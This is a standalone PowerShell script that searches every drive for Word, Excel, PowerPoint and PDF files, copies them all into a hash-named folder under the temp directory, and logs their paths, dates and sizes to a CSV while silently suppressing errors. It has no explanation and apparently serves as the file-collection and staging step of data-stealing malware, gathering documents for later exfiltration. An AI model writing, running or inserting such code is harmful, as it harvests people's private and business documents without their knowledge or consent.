$extensions = @('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf')

$destinationFolder = "$env:tmp\21f64da1e5792c8295b964d159a14491"

if (-not (Test-Path -Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder -Force
}

$filesInfo = @()

Get-PSDrive -PSProvider FileSystem | Select-Object Root | ForEach-Object {
    Get-ChildItem -Path $_.Root -Recurse -ErrorAction SilentlyContinue
} | Where-Object {
    $_.FullName -notmatch 'C:\\Program Files*|C:\\Windows*'
} | Where-Object {
    $extensions -contains $_.Extension
} | ForEach-Object {
    $destinationPath = Join-Path -Path $destinationFolder -ChildPath $_.Name
    try {
        Copy-Item $_.FullName -Destination $destinationPath -Force -ErrorAction Stop
        $filesInfo += [PSCustomObject]@{
            Name          = $_.Name
            FullName      = $_.FullName
            LastWriteTime = $_.LastWriteTime
            Length        = $_.Length
        }
    }
    catch {

    }
}

$csvFilePath = Join-Path -Path $destinationFolder -ChildPath 'CopiedFilesInfo.csv'
$filesInfo | Export-Csv -Path $csvFilePath -Encoding Unicode -NoTypeInformation